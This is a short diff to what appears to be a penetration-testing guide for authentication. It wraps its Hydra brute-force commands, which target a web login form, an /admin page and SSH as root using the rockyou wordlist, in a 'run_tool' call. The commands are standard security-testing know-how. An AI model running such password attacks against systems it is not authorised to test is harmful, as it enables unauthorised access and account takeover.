@@ -21,10 +21,10 @@ Check username enumeration: different errors for valid/invalid users, timing dif
 
 ### 2. Brute Force (Hydra)
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
+run_tool hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
   "/login:username=^USER^&password=^PASS^:Invalid credentials"
-hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin
-hydra -l root -P passwords.txt target ssh -t 4
+run_tool hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin
+run_tool hydra -l root -P passwords.txt target ssh -t 4
 # Rate-limited: -t 1 -W 5
 ```
 
